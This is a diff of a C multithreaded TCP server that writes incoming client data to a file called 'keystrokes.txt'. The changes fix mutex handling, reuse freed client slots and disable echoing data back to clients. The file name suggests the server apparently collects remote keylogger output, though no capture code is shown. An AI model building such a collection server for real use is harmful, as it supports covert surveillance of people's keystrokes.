@@ -106,9 +106,10 @@ int main(int argc, char *argv[])
     // Initialize number of clients online to 0.
     pthread_mutex_lock(&mutexFD);
     numOfClients = 0;
-    pthread_mutex_unlock(&mutexFD);
 
+    // Open file for writing.
     file_D = open("keystrokes.txt", O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
+    pthread_mutex_unlock(&mutexFD);
 
     while (numOfClients < MAX_CLIENTS)
     {
@@ -131,16 +132,20 @@ int main(int argc, char *argv[])
 
         // Store connected client's socket in the client_sockets array.
         pthread_mutex_lock(&mutexFD);
-        client_sockets[numOfClients] = client_sock;
-        pthread_mutex_unlock(&mutexFD);
-
-        // Increment number of clients online.
-        pthread_mutex_lock(&mutexFD);
-        numOfClients += 1;
-        pthread_mutex_unlock(&mutexFD);
-
+        for (int i = 0; i < MAX_CLIENTS; i++)
+        {
+            if (client_sockets[i] == 0)
+            {
+                client_sockets[i] = client_sock;
+                // Increment number of clients online.
+                numOfClients += 1;
+                break;
+            }
+        }
         printf("[#] Clients Online =>[%d]\n", numOfClients);
+        pthread_mutex_unlock(&mutexFD);
 
+        // Allocate memory for client argument struct.
         Client_Args *client_args = malloc(sizeof(Client_Args));
         if (client_args == NULL)
         {
@@ -200,21 +205,19 @@ void *handle_client(void *args)
         {
             fprintf(stderr, "[-] Client! [DISCONNECTED]\n");
 
-            // Decrement number of clients online.
-            pthread_mutex_lock(&mutexFD);
-            numOfClients -= 1;
-            pthread_mutex_unlock(&mutexFD);
-
-            // Remove client_sock for the client_sockets[] array.
+            // Remove client_sock from the client_sockets[] array.
             pthread_mutex_lock(&mutexFD);
             for (int i = 0; i < MAX_CLIENTS; i++)
             {
                 if (client_sockets[i] == client->client_socket) 
                 {
                     client_sockets[i] = 0;
-                    break;
+                    // Decrement number of clients online.
+                    numOfClients -= 1;
+                    break; 
                 }
             }
+            printf("[#] Clients Online =>[%d]\n", numOfClients);
             pthread_mutex_unlock(&mutexFD);
 
             // Clean up resources.
@@ -226,23 +229,21 @@ void *handle_client(void *args)
         {
             fprintf(stderr, "[x] Receive! [FAILED]\n");
             
-            // Decrement number of clients online.
-            pthread_mutex_lock(&mutexFD);
-            numOfClients -= 1;
-            pthread_mutex_unlock(&mutexFD);
-
-            // Remove client_sock for the client_sockets[] array.
+            // Remove client_sock from the client_sockets[] array.
             pthread_mutex_lock(&mutexFD);
             for (int i = 0; i < MAX_CLIENTS; i++)
             {
                 if (client_sockets[i] == client->client_socket) 
                 {
                     client_sockets[i] = 0;
-                    break;
+                    // Decrement number of clients online.
+                    numOfClients -= 1;
+                    break; 
                 }
             }
+            printf("[#] Clients Online =>[%d]\n", numOfClients);
             pthread_mutex_unlock(&mutexFD);
-            
+
             // Clean up resources.
             close(client->client_socket);
             free(client);
@@ -262,16 +263,16 @@ void *handle_client(void *args)
                buffer);
 
         // Echo back the message to the client.
-        ssize_t bytes_sent =
-            send(client->client_socket, buffer, bytes_received, 0);
-        if (bytes_sent < 0)
-        {
-            fprintf(stderr, "[x] Sending! [FAILED]\n");
-            close(client->client_socket);
-            free(client);
-            return NULL;
-        }
-        printf("[+] Sent %zu bytes to client [SUCCESS]\n", bytes_sent);
+        // ssize_t bytes_sent =
+        //     send(client->client_socket, buffer, bytes_received, 0);
+        // if (bytes_sent < 0)
+        // {
+        //     fprintf(stderr, "[x] Sending! [FAILED]\n");
+        //     close(client->client_socket);
+        //     free(client);
+        //     return NULL;
+        // }
+        // printf("[+] Sent %zu bytes to client [SUCCESS]\n", bytes_sent);
     }
 
     close(client->client_socket);
